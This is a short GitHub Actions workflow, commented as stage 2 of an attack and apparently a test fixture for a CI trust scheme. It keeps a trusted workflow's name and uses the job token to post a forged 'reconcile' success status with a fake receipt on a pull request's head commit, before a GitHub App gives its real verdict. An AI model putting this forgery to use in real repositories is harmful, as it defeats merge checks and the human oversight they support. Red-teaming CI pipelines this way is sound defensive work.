name: execute

# ATTACK (stage 2, forgery BEFORE the App verdict). Keeps the name, so the
# trusted workflow still runs and the App posts last. Forges reconcile=success
# immediately with GITHUB_TOKEN and uploads no evidence.

on:
  pull_request:

permissions:
  contents: read
  statuses: write

jobs:
  execute:
    runs-on: ubuntu-latest
    steps:
      - name: forge the reconcile verdict first
        env:
          GH_TOKEN: ${{ github.token }}
          HEAD_SHA: ${{ github.event.pull_request.head.sha }}
        run: |
          gh api --method POST "repos/$GITHUB_REPOSITORY/statuses/$HEAD_SHA" \
            -f state=success -f context=reconcile \
            -f description="receipt sha256:forged-before-the-app-verdict"
